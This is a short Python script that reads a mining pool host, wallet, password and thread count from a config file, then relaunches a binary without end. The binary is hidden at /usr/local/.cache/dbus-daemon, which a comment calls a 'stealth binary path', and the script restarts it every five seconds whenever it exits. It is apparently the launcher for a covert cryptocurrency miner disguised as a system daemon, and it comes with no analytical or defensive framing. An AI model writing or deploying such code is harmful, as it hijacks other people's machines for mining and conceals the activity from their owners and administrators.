import subprocess
import time
import os
import sys

def load_config(filename="data.txt"):
    config = {}
    with open(filename, "r") as f:
        for line in f:
            if "=" in line:
                key, val = line.strip().split("=", 1)
                config[key.strip()] = val.strip()
    return config

def main():
    bin_path = "/usr/local/.cache/dbus-daemon"  # stealth binary path

    if not os.path.isfile(bin_path):
        print(f"Error: Required binary not found at {bin_path}. Exiting.")
        sys.exit(1)

    cfg = load_config()

    args = [
        bin_path,
        "-a", cfg.get("algorithm", "power2b"),
        "-o", cfg.get("host", ""),
        "-u", cfg.get("wallet", ""),
        "-p", cfg.get("password", "x"),
        "-t", cfg.get("threads", "1"),
    ]

    while True:
        proc = subprocess.Popen(args)
        proc.wait()
        time.sleep(5)

if __name__ == "__main__":
    main()
